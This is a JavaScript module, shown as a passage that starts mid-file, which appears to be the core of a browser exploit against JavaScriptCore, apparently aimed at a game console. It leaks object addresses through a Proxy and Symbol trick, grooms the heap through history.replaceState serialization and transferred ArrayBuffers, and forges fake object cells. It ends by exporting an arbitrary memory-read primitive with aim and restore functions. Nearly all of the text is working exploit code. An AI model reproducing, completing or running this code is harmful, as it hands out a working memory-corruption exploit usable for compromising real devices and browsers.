  identityResult = checkCarrierIdentity(candidate);
  return identityResult === 1;
}
function ceilingReached() {
  return attemptCeiling > 0 && attemptNumber >= attemptCeiling;
}
function giveUp(reason) {
  stopped = true;
  emit("CORE-GIVE-UP", "reason=".concat(reason, "-attempts=").concat(attemptNumber));
  var reject = settleReject;
  settleResolve = null;
  settleReject = null;
  running = false;
  if (reject !== null) reject(new Error("core: gave up after ".concat(attemptNumber, " attempts (").concat(reason, ")")));
}
function failed() {
  if (ceilingReached()) {
    giveUp("attempt-ceiling");
    return;
  }
  emit("AUTO-RETRY-AFTER-FAILURE", "attempt=".concat(attemptNumber));
  stopped = false;
  retryScheduled = false;
  setTimeout(function () {
    try {
      history.replaceState(null, "");
    } catch {}
    attemptNumber++;
    startAttempt();
  }, AUTO_RETRY_DELAY_MS);
}
function releaseAttemptAllocations() {
  referenceTarget = null;
  rwBuffer = null;
  rwView = null;
  rwMirror = null;
  targetBuffer = null;
  targetView = null;
  fakeHost = null;
  lengthWord = null;
  anchorElement = null;
  markerObjectA = null;
  markerObjectB = null;
  targetHolder = null;
  holderGuardA = null;
  holderGuardB = null;
  fillerGraph = null;
  outerGraph = null;
  leakedScope = null;
  getterCarrier = null;
  preparedSymbolObject = null;
  capturedString = null;
  capturedWords = null;
  predecessorWords = null;
  keepAlive = null;
  try {
    history.replaceState(null, "");
  } catch {}
  if (typeof globalThis.gc === "function") {
    try {
      globalThis.gc();
    } catch {}
  }
}
function scheduleSafeRetry(reason) {
  if (retryScheduled || stopped) return;
  var candidateStateSafe = !candidateEverReturned || zeroHeaderMiss && !candidateMutationStarted;
  if (!retrySafe || !candidateStateSafe || candidateMutationStarted || !attemptPersisted) {
    emit("AUTO-RETRY-NOT-SCHEDULED", "reason=".concat(reason) + "-safe=".concat(retrySafe) + "-candidate-seen=".concat(candidateEverReturned) + "-candidate-mutated=".concat(candidateMutationStarted) + "-candidate-state-safe=".concat(candidateStateSafe) + "-attempt-persisted=".concat(attemptPersisted));
    failed();
    return;
  }
  if (ceilingReached()) {
    giveUp("attempt-ceiling");
    return;
  }
  retryScheduled = true;
  var nextAttempt = attemptNumber + 1;
  emit("AUTO-RETRY-SCHEDULED", "reason=".concat(reason, "-next-attempt=").concat(nextAttempt));
  releaseAttemptAllocations();
  setTimeout(function () {
    var candidateStillSafe = !candidateEverReturned || zeroHeaderMiss && !candidateMutationStarted;
    if (!retrySafe || !candidateStillSafe || candidateMutationStarted || stopped) {
      emit("AUTO-RETRY-CANCELLED", "reason=".concat(reason) + "-retry-safe=".concat(retrySafe) + "-candidate-safe=".concat(candidateStillSafe) + "-candidate-mutated=".concat(candidateMutationStarted));
      failed();
      return;
    }
    attemptNumber = nextAttempt;
    startAttempt();
  }, Math.max(AUTO_RETRY_DELAY_MS, 750));
}
function finishEarlySafeAttempt(tag, extra, reason) {
  retrySafe = true;
  emit(tag, "".concat(extra, "-retry-safe=true-candidate-seen=false") + "-candidate-mutated=false");
  scheduleSafeRetry(reason);
}
function resetAttemptState() {
  referenceTarget = null;
  rwBuffer = null;
  rwView = null;
  rwMirror = null;
  targetBuffer = null;
  targetView = null;
  fakeHost = null;
  lengthWord = null;
  anchorElement = null;
  markerObjectA = null;
  markerObjectB = null;
  targetHolder = null;
  holderGuardA = null;
  holderGuardB = null;
  fillerGraph = null;
  outerGraph = null;
  leakedScope = null;
  getterCarrier = null;
  preparedSymbolObject = null;
  capturedString = null;
  capturedWords = null;
  copiedLength = 0;
  captureState = 0;
  captureError = null;
  hostAddress = NaN;
  fakeAddress = NaN;
  predecessorWords = null;
  keepAlive = new Array(DRAIN_COUNT + 3);
  keepIndex = 0;
  pointerLow = 0;
  pointerHigh = 0;
  targetAddress = NaN;
  targetAddressLow = 0;
  targetAddressHigh = 0;
  nativeTargetAddress = NaN;
  anchorElementAddress = NaN;
  markerAAddress = NaN;
  markerBAddress = NaN;
  rwOriginalVector = NaN;
  rwHeaderOK = false;
  holderHeaderOK = false;
  functionHeaderOK = false;
  nativeExecutableHeaderOK = false;
  functionStructureID = 0;
  nativeExecutableStructureID = 0;
  executableAddress = NaN;
  nativeFunctionAddress = NaN;
  nativeConstructorAddress = NaN;
  pointersRepeated = false;
  restoreObserved = false;
  retrySafe = false;
  retryScheduled = false;
  candidateEverReturned = false;
  candidateMutationStarted = false;
  zeroHeaderMiss = false;
  identityResult = 0;
  identityBytes.fill(0);
  compositionState = 0;
  compositionLength = 0;
  compositionError = null;
  liveCandidate = null;
  resetProfile();
  rwHeader.fill(0);
  targetHeader.fill(0);
  holderHeader.fill(0);
}
function startAttempt() {
  if (fakeReleased) return;
  if (stopped) return;
  resetAttemptState();
  try {
    sessionStorage.setItem(attemptKey, String(attemptNumber));
    attemptPersisted = sessionStorage.getItem(attemptKey) === String(attemptNumber);
  } catch {}
  emit("ATTEMPT-START", "attempt-persisted=".concat(attemptPersisted) + "-capture-ms=".concat(CAPTURE_DELAY_MS, "-compose-ms=").concat(COMPOSE_DELAY_MS));
  try {
    buildAndStoreGraph();
    for (var i = 0; i < 8; ++i) rwView[IDENT_OFFSET + i] = identityMagic[i];
    prepareAddrof();
  } catch (error) {
    finishEarlySafeAttempt("SETUP-THREW", "".concat(error?.name, ":").concat(String(error?.message).slice(0, 80)), "setup-threw");
  }
}
function leakScopeObject() {
  class Leaker {
    leak() {
      return super.foo;
    }
  }
  Leaker.prototype.__proto__ = new Proxy({}, {
    get: function (target, property, receiver) {
      return receiver;
    }
  });
  var leak = Leaker.prototype.leak;
  return function () {
    return leak();
  }();
}
function prepareSymbolWrapper(F) {
  leakedScope = leakScopeObject();
  if (leakedScope === undefined || leakedScope === null) throw new Error("scope-not-leaked");
  for (var i = 0; i < 512; i++) leakedScope["p".concat(i)] = i;
  for (var j = 0; j < 8; j++) leakedScope[j] = 1.1 * j;
  Object.defineProperty(leakedScope, "g", {
    get: F,
    configurable: true
  });
  return Object(leakedScope.g);
}
function buildFakeHost() {
  rwBuffer = new ArrayBuffer(RW_BUFFER_SIZE);
  rwView = new Uint8Array(rwBuffer);
  rwMirror = new Uint8Array(rwBuffer);
  rwMirror[0] = 0x3c;
  targetBuffer = new ArrayBuffer(0x20);
  targetView = new Uint8Array(targetBuffer);
  targetView[0] = 0xa5;
  lengthWord = {
    keep: 0x51515151
  };
  fakeHost = {
    q0: encodedHeaderNumber(),
    q1: 1.1,
    q2: rwView,
    q3: lengthWord,
    q4: 2.2,
    q5: 3.3
  };
  delete fakeHost.q1;
  delete fakeHost.q4;
  delete fakeHost.q5;
  if (!Number.isFinite(fakeHost.q0) || fakeHost.q2 !== rwView || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c || targetView[0] !== 0xa5 || typeof nativeTarget !== "function") throw new Error("fake-host-shape-failed");
  anchorElement = document.createElement("textarea");
  markerObjectA = {
    marker: 0x4d41524b,
    kind: "probe-marker-a"
  };
  markerObjectB = {
    marker: 0x4d41524c,
    kind: "probe-marker-b"
  };
  holderGuardA = {
    marker: 0x484f4c44
  };
  holderGuardB = {
    marker: 0x47554152
  };
  targetHolder = {
    q0: nativeTarget,
    q1: anchorElement,
    q2: markerObjectA,
    q3: markerObjectB,
    q4: holderGuardA,
    q5: holderGuardB
  };
  if (targetHolder.q0 !== nativeTarget || targetHolder.q1 !== anchorElement || targetHolder.q2 !== markerObjectA || targetHolder.q3 !== markerObjectB || targetHolder.q4 !== holderGuardA || targetHolder.q5 !== holderGuardB || anchorElement === null || typeof anchorElement !== "object" || markerObjectA.marker !== 0x4d41524b || markerObjectB.marker !== 0x4d41524c) throw new Error("probe-holder-shape-failed");
}
function buildAndStoreGraph() {
  referenceTarget = {
    marker: 0x51515151,
    kind: "serialized-reference"
  };
  buildFakeHost();
  emit("SSV-BUILD", "k=".concat(K, "-n=").concat(DRAIN_COUNT));
  fillerGraph = new Array(0xfffd);
  var pos = 0;
  var huge = 1n << 40n;
  for (var b = 0; b < FILLER_BIGINTS; ++b) fillerGraph[pos++] = huge + BigInt(b);
  for (var o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = {};
  outerGraph = new Array(CONTROL_INDEX + 1);
  outerGraph[0] = fillerGraph;
  outerGraph[1] = referenceTarget;
  outerGraph[2] = referenceTarget;
  outerGraph[CONTROL_INDEX] = CONTROL_INT;
  emit("SSV-BUILT", "duplicate-index=".concat(DUPLICATE_INDEX));
  emit("SSV-STORE-ENTER", "writer-ref=0x".concat((0x10000 - K).toString(16)));
  history.replaceState(outerGraph, "");
  emit("SSV-STORED", "fake-host-and-probe-holder-not-serialized");
}
function prepareAddrof() {
  capturedWords = new Uint16Array(16);
  getterCarrier = function getterCarrierFunction() {
    return 7;
  };
  emit("ADDROF-PREP-BEGIN", "slots=".concat(CARRIER_SLOTS, "-bytes=").concat(CARRIER_BYTES));
  getterCarrier[0] = fakeHost;
  for (var i = 1; i < CARRIER_SLOTS; i++) getterCarrier[i] = 0;
  getterCarrier[1] = targetHolder;
  getterCarrier[2] = fakeHost;
  getterCarrier[3] = targetHolder;
  emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");
  preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
  emit("ADDROF-WRAPPER-READY", "wait=".concat(CAPTURE_DELAY_MS, "ms"));
  setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
  setTimeout(beginComposition, COMPOSE_DELAY_MS);
}
function runAddrofCapture() {
  try {
    capturedString = symbolToString.call(preparedSymbolObject);
    copiedLength = capturedString.length;
    for (var i = 0; i < 16; i++) capturedWords[i] = capturedString.charCodeAt(7 + i);
    captureState = 1;
  } catch (error) {
    captureError = error;
    captureState = -1;
  }
}
function fillRawCellPointers(backing, pointer) {
  pointerHigh = Math.floor(pointer / 0x100000000);
  pointerLow = pointer - pointerHigh * 0x100000000;
  if (!plausibleCell(pointer) || pointerHigh < 0 || pointerHigh > 0xffff || Math.floor(pointerLow) !== pointerLow || pointerLow < 0 || pointerLow > 0xffffffff || pointerLow + pointerHigh * 0x100000000 !== pointer) throw new Error("invalid-low48-fake-address");
  predecessorWords = new Uint32Array(backing);
  for (var i = 0; i < predecessorWords.length; i += 2) {
    predecessorWords[i] = pointerLow;
    predecessorWords[i + 1] = pointerHigh;
  }
  var last = predecessorWords.length - 2;
  if (predecessorWords[0] !== pointerLow || predecessorWords[1] !== pointerHigh || predecessorWords[last] !== pointerLow || predecessorWords[last + 1] !== pointerHigh) throw new Error("pointer-fill-verification-failed");
}
function clearPredecessor() {
  if (predecessorWords !== null) predecessorWords.fill(0);
}
function loadHistoryCritical() {
  var result = null;
  var candidate = null;
  var rwHeaderCaptured = false;
  var rwVectorTouched = false;
  try {
    result = history.state;
    compositionLength = result.length;
    if (compositionLength !== EXPECTED_LENGTH) {
      result[DUPLICATE_INDEX] = undefined;
      result = null;
      clearPredecessor();
      retrySafe = true;
      compositionState = 3;
      return;
    }
    if (result[1] === result[DUPLICATE_INDEX]) {
      result[DUPLICATE_INDEX] = undefined;
      candidate = null;
      result = null;
      clearPredecessor();
      retrySafe = true;
      compositionState = 2;
      return;
    }
    candidate = result[DUPLICATE_INDEX];
    candidateEverReturned = true;
    result[DUPLICATE_INDEX] = undefined;
    result = null;
    readBytes(rwHeader, candidate, CELL_BYTES);
    rwHeaderCaptured = true;
    var rwSID = uint32At(rwHeader, 0);
    var rwButterfly = low48At(rwHeader, 8);
    var rwLength = uint32At(rwHeader, 0x18);
    rwOriginalVector = low48At(rwHeader, 0x10);
    var rwTailByte = rwHeader[0x20];
    var rwOffsetZero = allZero(rwHeader, 0x21, 0x28) && (rwTailByte === 0 || rwTailByte === 2);
    profile.carrierSID = rwSID;
    profile.carrierType = rwHeader[5];
    profile.carrierFlags = rwHeader[6];
    profile.carrierMode = rwHeader[0x1c];
    profile.carrierByte28 = rwHeader[0x28];
    profile.carrierByte20 = rwHeader[0x20];
    rwHeaderOK = rwSID >= 0x100 && rwSID < 0x08000000 && rwHeader[4] === 0 && (rwHeader[7] === 0 || rwHeader[7] === 1) && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0 && rwButterfly > 0x100000000 && rwButterfly % 8 === 0 && rwHeader[0x16] === 0 && rwHeader[0x17] === 0 && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0 && rwLength === RW_BUFFER_SIZE && rwHeader[0x1d] === 0 && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0 && rwOffsetZero;
    if (!rwHeaderOK) {
      zeroHeaderMiss = allZero(rwHeader, 0, CELL_BYTES);
      retrySafe = zeroHeaderMiss && !rwVectorTouched && !candidateMutationStarted;
      candidate = null;
      clearPredecessor();
      compositionState = 3;
      return;
    }
    rwVectorTouched = true;
    var identityProved = runIdentityProof(candidate);
    rwVectorTouched = false;
    if (!identityProved) {
      candidate = null;
      clearPredecessor();
      compositionState = 3;
      return;
    }
    for (var i = 0; i < 8; ++i) scratchBytes[i] = rwHeader[i];
    if (scratchBytes[6] >= 2) {
      scratchBytes[6] -= 2;
    } else {
      scratchBytes[6] = scratchBytes[6] + 0x100 - 2 & 0xff;
      scratchBytes[7] = scratchBytes[7] - 1 & 0xff;
    }
    var upgradedHeader = scratchDouble[0];
    var upgradedFinite = upgradedHeader === upgradedHeader && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
    if (!upgradedFinite) {
      candidate = null;
      clearPredecessor();
      compositionState = 3;
      return;
    }
    candidateMutationStarted = true;
    fakeHost.q0 = upgradedHeader;
    if (fakeHost.q0 !== upgradedHeader) {
      candidate = null;
      clearPredecessor();
      compositionState = 3;
      return;
    }
    rwVectorTouched = true;
    aimCarrier(candidate, targetAddress);
    var holderRepeated = readTwiceMatches(holderHeader, rwView, HOLDER_BYTES);
    var holderSID = uint32At(holderHeader, 0);
    var holderButterflyZero = allZero(holderHeader, 0x08, 0x10);
    nativeTargetAddress = low48At(holderHeader, 0x10);
    anchorElementAddress = low48At(holderHeader, 0x18);
    markerAAddress = low48At(holderHeader, 0x20);
    markerBAddress = low48At(holderHeader, 0x28);
    var holderGuardAAddress = low48At(holderHeader, 0x30);
    var holderGuardBAddress = low48At(holderHeader, 0x38);
    profile.holderSID = holderSID;
    profile.holderType = holderHeader[5];
    profile.holderFlags = holderHeader[6];
    holderHeaderOK = holderRepeated && holderSID >= 0x100 && holderSID < 0x08000000 && targetAddress % 0x10 === 0 && holderHeader[4] === 0 && (holderHeader[7] === 0 || holderHeader[7] === 1) && holderButterflyZero && plausibleCell(nativeTargetAddress) && plausibleCell(anchorElementAddress) && plausibleCell(markerAAddress) && plausibleCell(markerBAddress) && plausibleCell(holderGuardAAddress) && plausibleCell(holderGuardBAddress) && canonicalLow48(holderHeader, 0x10) && canonicalLow48(holderHeader, 0x18) && canonicalLow48(holderHeader, 0x20) && canonicalLow48(holderHeader, 0x28) && canonicalLow48(holderHeader, 0x30) && canonicalLow48(holderHeader, 0x38) && nativeTargetAddress !== anchorElementAddress && nativeTargetAddress !== markerAAddress && anchorElementAddress !== markerAAddress && markerAAddress !== markerBAddress && holderGuardAAddress !== holderGuardBAddress;
    if (!holderHeaderOK) {
      restoreCarrier(candidate);
      rwVectorTouched = false;
      candidate = null;
      clearPredecessor();
      compositionState = 3;
      return;
    }
    aimCarrier(candidate, nativeTargetAddress);
    readBytes(targetHeader, rwView, FUNCTION_BYTES);
    functionStructureID = uint32At(targetHeader, 0);
    var functionButterfly = low48At(targetHeader, 0x08);
    var functionScope = low48At(targetHeader, 0x10);
    executableAddress = low48At(targetHeader, 0x18);
    profile.functionSID = functionStructureID;
    profile.functionType = targetHeader[5];
    profile.functionFlags = targetHeader[6];
    var functionType1 = targetHeader[5];
    functionHeaderOK = functionStructureID >= 0x100 && functionStructureID < 0x08000000 && nativeTargetAddress % 0x10 === 0 && targetHeader[4] === 0 && (targetHeader[7] === 0 || targetHeader[7] === 1) && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0 && targetHeader[0x16] === 0 && targetHeader[0x17] === 0 && targetHeader[0x1e] === 0 && targetHeader[0x1f] === 0 && functionButterfly > 0x100000000 && functionButterfly <= 0xffffffffffff && functionButterfly % 8 === 0 && functionScope > 0x100000000 && functionScope <= 0xffffffffffff && functionScope % 8 === 0 && executableAddress > 0x100000000 && executableAddress <= 0xffffffffffff && executableAddress % 0x10 === 0 && (executableAddress & 1) === 0;
    if (!functionHeaderOK) {
      restoreCarrier(candidate);
      rwVectorTouched = false;
      candidate = null;
      clearPredecessor();
      compositionState = 3;
      return;
    }
    aimCarrier(candidate, executableAddress);
    readBytes(targetHeader, rwView, NATIVE_EXECUTABLE_BYTES);
    nativeExecutableStructureID = uint32At(targetHeader, 0);
    nativeFunctionAddress = low48At(targetHeader, 0x28);
    nativeConstructorAddress = low48At(targetHeader, 0x30);
    profile.nativeExecSID = nativeExecutableStructureID;
    profile.nativeExecType = targetHeader[5];
    profile.nativeExecFlags = targetHeader[6];
    try {
      globalThis.__ps5NativeCtor = nativeConstructorAddress;
    } catch (e) {}
    var nativeExecType1 = targetHeader[5];
    nativeExecutableHeaderOK = nativeExecutableStructureID >= 0x100 && nativeExecutableStructureID < 0x08000000 && targetHeader[4] === 0 && (targetHeader[7] === 0 || targetHeader[7] === 1) && targetHeader[0x2e] === 0 && targetHeader[0x2f] === 0 && targetHeader[0x36] === 0 && targetHeader[0x37] === 0 && plausibleAddress(nativeFunctionAddress) && plausibleAddress(nativeConstructorAddress) && canonicalLow48(targetHeader, 0x28) && canonicalLow48(targetHeader, 0x30) && nativeFunctionAddress !== nativeConstructorAddress;
    if (!nativeExecutableHeaderOK) {
      restoreCarrier(candidate);
      rwVectorTouched = false;
      candidate = null;
      clearPredecessor();
      compositionState = 3;
      return;
    }
    aimCarrier(candidate, nativeTargetAddress);
    var executableAddress2 = low48At(rwView, 0x18);
    var functionType2 = rwView[5];
    aimCarrier(candidate, executableAddress);
    var nativeFunctionAddress2 = low48At(rwView, 0x28);
    var nativeConstructorAddress2 = low48At(rwView, 0x30);
    var nativeExecutableType2 = rwView[5];
    pointersRepeated = executableAddress2 === executableAddress && nativeFunctionAddress2 === nativeFunctionAddress && nativeConstructorAddress2 === nativeConstructorAddress && functionType2 === functionType1 && nativeExecutableType2 === nativeExecType1;
    restoreCarrier(candidate);
    rwVectorTouched = false;
    targetView[0] = 0xa5;
    rwMirror[0] = 0x3c;
    restoreObserved = rwView[0] === 0x3c && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
    liveCandidate = candidate;
    candidate = null;
    clearPredecessor();
    compositionState = 1;
  } catch (error) {
    retrySafe = candidate === null && result === null && !rwHeaderCaptured && error?.name === "TypeError";
    if (result !== null) {
      try {
        result[DUPLICATE_INDEX] = undefined;
      } catch {}
    }
    if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
      try {
        restoreCarrier(candidate);
      } catch {}
    }
    candidate = null;
    result = null;
    try {
      targetView[0] = 0xa5;
    } catch {}
    try {
      rwMirror[0] = 0x3c;
    } catch {}
    try {
      clearPredecessor();
    } catch {}
    compositionError = error;
    compositionState = -1;
  }
}
function runGroomAndLoad() {
  try {
    emit("SSV-GROOM-ENTER", "n=".concat(DRAIN_COUNT));
    var channel = new MessageChannel();
    channel.port1.close();
    channel.port2.close();
    for (var i = 0; i < DRAIN_COUNT; ++i) keepAlive[keepIndex++] = buffer(DRAIN_SIZE);
    var slab = buffer(SLAB_SIZE);
    channel.port1.postMessage(0, [slab]);
    slab = null;
    var butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
    var butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
    var separator = buffer(SEPARATOR_SIZE);
    var earlyHole = buffer(EARLY_HOLE_SIZE);
    var guard = buffer(GUARD_SIZE);
    var predecessor = buffer(PREDECESSOR_SIZE);
    var finalHole = buffer(FINAL_HOLE_SIZE);
    fillRawCellPointers(predecessor, fakeAddress);
    keepAlive[keepIndex++] = separator;
    keepAlive[keepIndex++] = guard;
    keepAlive[keepIndex++] = predecessor;
    emit("PREDECESSOR-FILLED", "qwords=".concat(PREDECESSOR_SIZE / 8) + "-fake=".concat(hex(fakeAddress)));
    criticalBarrier(fakeAddress, targetAddress);
    channel.port1.postMessage(0, [butterflyHole1, butterflyHole2, earlyHole, finalHole]);
    loadHistoryCritical();
  } catch (error) {
    try {
      clearPredecessor();
    } catch {}
    retrySafe = true;
    compositionError = error;
    compositionState = -1;
  }
  reportComposition();
}
var barrierNode = null;
function ensureBarrierNode() {
  if (barrierNode !== null) return;
  try {
    barrierNode = document.createElement("div");
    barrierNode.style.cssText = "position:absolute;left:-9999px;top:0";
    document.body.appendChild(barrierNode);
  } catch {
    barrierNode = null;
  }
}
function defaultCriticalBarrier(fake, target) {
  try {
    var line = "CRITICAL-LOAD-NEXT-fake=".concat(hex(fake), "-target=").concat(hex(target));
    if (barrierNode !== null) {
      barrierNode.textContent = line;
      void barrierNode.offsetWidth;
    }
    void new Blob([line], {
      type: "text/plain"
    });
    try {
      sessionStorage.setItem(burstKey, line);
    } catch {}
  } catch {}
}
function beginComposition() {
  if (captureState === 0) {
    finishEarlySafeAttempt("ADDROF-NO-RESULT", "capture-task-did-not-finish", "addrof-no-result");
    return;
  }
  if (captureState < 0) {
    finishEarlySafeAttempt("ADDROF-THREW", "".concat(captureError?.name, ":") + String(captureError?.message).slice(0, 80), "addrof-threw");
    return;
  }
  var a0 = pointerFromWords(capturedWords, 0);
  var b0 = pointerFromWords(capturedWords, 4);
  var a1 = pointerFromWords(capturedWords, 8);
  var b1 = pointerFromWords(capturedWords, 12);
  var repeated = a0 === a1 && b0 === b1;
  var distinct = a0 !== b0;
  var plausible = plausibleCell(a0) && plausibleCell(b0) && plausibleCell(a1) && plausibleCell(b1);
  var fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
  var sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
  emit("ADDROF-RETURNED", REVISION);
  emit("ADDROF-COPY", "chars=".concat(copiedLength, "-source-covered=").concat(sourceCovered));
  emit("ADDROF-POINTERS", "HOST=".concat(hex(a0), "-TARGET=").concat(hex(b0)) + "-HOST2=".concat(hex(a1), "-TARGET2=").concat(hex(b1)));
  if (!(repeated && distinct && plausible && sourceCovered)) {
    finishEarlySafeAttempt("ADDROF-FAIL", "repeat=".concat(repeated, "-distinct=").concat(distinct) + "-plausible=".concat(plausible, "-covered=").concat(sourceCovered), "addrof-validation");
    return;
  }
  hostAddress = a0;
  targetAddress = b0;
  targetAddressHigh = Math.floor(targetAddress / 0x100000000);
  targetAddressLow = targetAddress - targetAddressHigh * 0x100000000;
  if (targetAddressHigh < 0 || targetAddressHigh > 0xffff || targetAddressLow < 0 || targetAddressLow > 0xffffffff || Math.floor(targetAddressLow) !== targetAddressLow || targetAddressLow + targetAddressHigh * 0x100000000 !== targetAddress) {
    finishEarlySafeAttempt("TARGET-ADDRESS-FAIL", "target=".concat(hex(targetAddress)), "target-address");
    return;
  }
  fakeAddress = hostAddress + 0x10;
  if (!plausibleCell(fakeAddress) || fakeAddress - hostAddress !== 0x10) {
    finishEarlySafeAttempt("FAKE-ADDRESS-FAIL", "host=".concat(hex(hostAddress)), "fake-address");
    return;
  }
  emit("FAKE-ADDRESS", "host=".concat(hex(hostAddress), "-fake=").concat(hex(fakeAddress)) + "-delta=0x10");
  runGroomAndLoad();
}
function reportComposition() {
  if (compositionState < 0) {
    emit(retrySafe ? "SSV-PLACEMENT-MISS" : "LOAD-THREW", "".concat(compositionError?.name, ":") + String(compositionError?.message).slice(0, 80));
    if (!retrySafe) failed();else scheduleSafeRetry("placement-throw");
    return;
  }
  if (compositionState === 2) {
    emit("NORMAL-CLONE-MISS", "known-reference-returned=true");
    scheduleSafeRetry("normal-clone-miss");
    return;
  }
  if (compositionState === 3) {
    emit(identityResult === -1 ? "CARRIER-IDENTITY-FAIL" : zeroHeaderMiss ? "ZERO-HEADER-MISS" : retrySafe ? "COMPOSITION-LENGTH-MISS" : "VALIDATION-MISMATCH", "rw=".concat(rwHeaderOK, "-holder=").concat(holderHeaderOK) + "-function=".concat(functionHeaderOK) + "-native-executable=".concat(nativeExecutableHeaderOK) + "-repeat=".concat(pointersRepeated, "-retry-safe=").concat(retrySafe) + "-identity=".concat(identityResult) + "-hex=".concat(dumpHex(rwHeader, CELL_BYTES)));
    if (!retrySafe) failed();else scheduleSafeRetry(zeroHeaderMiss ? "zero-header-miss" : "composition-length-mismatch");
    return;
  }
  if (compositionState === 0) {
    emit("NO-RESULT", "critical-load-did-not-finish");
    failed();
    return;
  }
  emit("SSV-RETURNED-CLEARED", "length=".concat(compositionLength) + "-predecessor-cleared=true");
  emit("RW-CARRIER", "sid=".concat(hex(profile.carrierSID)) + "-vector=".concat(hex(rwOriginalVector)) + "-length=".concat(hex(uint32At(rwHeader, 0x18))) + "-mode=".concat(hex(profile.carrierMode)));
  emit("HOLDER", "cell=".concat(hex(targetAddress)) + "-textarea=".concat(hex(anchorElementAddress)) + "-markerA=".concat(hex(markerAAddress), "-markerB=").concat(hex(markerBAddress)));
  emit("JSC-PROFILE", "u8=".concat(hex(profile.carrierType)) + "-u8flags=".concat(hex(profile.carrierFlags)) + "-mode=".concat(hex(profile.carrierMode)) + "-obj=".concat(hex(profile.holderType)) + "-objflags=".concat(hex(profile.holderFlags)) + "-fn=".concat(hex(profile.functionType)) + "-fnflags=".concat(hex(profile.functionFlags)) + "-nx=".concat(hex(profile.nativeExecType)) + "-nxflags=".concat(hex(profile.nativeExecFlags)));
  emit("RW-HEADER-HEX", dumpHex(rwHeader, CELL_BYTES));
  var leakPass = rwHeaderOK && holderHeaderOK && functionHeaderOK && nativeExecutableHeaderOK && pointersRepeated && restoreObserved && compositionLength === EXPECTED_LENGTH && liveCandidate !== null;
  if (!leakPass) {
    emit("READ-PRIMITIVE-MISMATCH", "rw=".concat(rwHeaderOK) + "-holder=".concat(holderHeaderOK, "-function=").concat(functionHeaderOK) + "-native=".concat(nativeExecutableHeaderOK) + "-repeat=".concat(pointersRepeated, "-restore=").concat(restoreObserved));
    liveCandidate = null;
    failed();
    return;
  }
  emit("READ-PRIMITIVE-PASS", "arbitrary-read-established" + "-firmware-offsets-asserted=none");
  try {
    history.replaceState(null, "");
  } catch {}
  stopped = true;
  running = false;
  var resolve = settleResolve;
  settleResolve = null;
  settleReject = null;
  if (resolve !== null) resolve(buildCarrier());
}
function buildCarrier() {
  profile.cellSize = 0x20;
  return {
    aim(address) {
      if (liveCandidate === null) throw new Error("core.aim: carrier is no longer live");
      if (!plausibleAddress(address)) throw new RangeError("core.aim: implausible address ".concat(address));
      aimCarrier(liveCandidate, address);
    },
    restore() {
      if (liveCandidate === null) throw new Error("core.restore: carrier is no longer live");
      restoreCarrier(liveCandidate);
    },
    get view() {
      return rwView;
    },
    windowBytes: RW_BUFFER_SIZE,
    holder: targetHolder,
    holderAddress: targetAddress,
    leakSlotOffset: LEAK_SLOT_OFFSET,
    leakSlotAddress: targetAddress + LEAK_SLOT_OFFSET,
    setLeakSlot(value) {
      targetHolder.q2 = value;
    },
    clearLeakSlot() {
      targetHolder.q2 = markerObjectA;
    },
    anchorObject: markerObjectA,
    anchorObjectAddress: markerAAddress,
    textarea: anchorElement,
    textareaAddress: anchorElementAddress,
    profile,
    attempts: attemptNumber,
    validate: plausibleAddress,
    hostAddress,
    fakeAddress,
    assertHome() {
      if (liveCandidate === null || rwView === null || targetView === null || rwMirror === null) return false;
      return rwView[0] === 0x3c && rwMirror[0] === 0x3c && targetView[0] === 0xa5;
    }
  };
}
export function establishPrimitive(options) {
  var opts = options || {};
  if (fakeReleased) return Promise.reject(new Error("core: the fake cell has been released to the real-cell pair -- " + "establishPrimitive cannot run again in this page"));
  if (running) return Promise.reject(new Error("core: already running"));
  if (typeof BigInt !== "function" || typeof MessageChannel !== "function" || typeof Symbol !== "function" || typeof history === "undefined" || typeof history.replaceState !== "function") return Promise.reject(new Error("core: unsupported browser"));
  onEvent = typeof opts.onEvent === "function" ? opts.onEvent : null;
  criticalBarrier = typeof opts.beforeCriticalLoad === "function" ? opts.beforeCriticalLoad : defaultCriticalBarrier;
  if (criticalBarrier === defaultCriticalBarrier) ensureBarrierNode();
  attemptCeiling = typeof opts.maxAttempts === "number" && opts.maxAttempts > 0 ? opts.maxAttempts : 0;
  running = true;
  stopped = false;
  attemptNumber = 1;
  try {
    sessionStorage.removeItem(attemptKey);
  } catch {}
  return new Promise(function (resolve, reject) {
    settleResolve = resolve;
    settleReject = reject;
    startAttempt();
  });
}
export function currentCarrier() {
  return liveCandidate === null ? null : buildCarrier();
}
var RELEASED_BINDINGS = ["liveCandidate", "fakeHost", "lengthWord", "getterCarrier", "leakedScope", "preparedSymbolObject", "capturedString", "capturedWords", "predecessorWords", "outerGraph", "fillerGraph", "referenceTarget", "keepAlive"];
export function releaseFakeCell() {
  var report = {
    released: RELEASED_BINDINGS.slice(),
    alreadyReleased: fakeReleased,
    hostAddress,
    fakeAddress,
    historyCleared: false
  };
  if (fakeReleased) return report;
  liveCandidate = null;
  fakeHost = null;
  lengthWord = null;
  getterCarrier = null;
  leakedScope = null;
  preparedSymbolObject = null;
  capturedString = null;
  capturedWords = null;
  predecessorWords = null;
  outerGraph = null;
  fillerGraph = null;
  referenceTarget = null;
  keepAlive = null;
  try {
    history.replaceState(null, "");
    report.historyCleared = history.state === null;
  } catch (_) {}
  fakeReleased = true;
  stopped = true;
  running = false;
  retryScheduled = false;
  return report;
}
export function fakeCellReleased() {
  return fakeReleased;
}
export function carrierHeaderCopy() {
  return rwHeader.slice(0, CELL_BYTES);
}
export function carrierHomeVector() {
  return rwOriginalVector;
}
export { profile, aimCarrier, restoreCarrier, plausibleAddress, plausibleCell };


import { int64 } from "./int64.js";
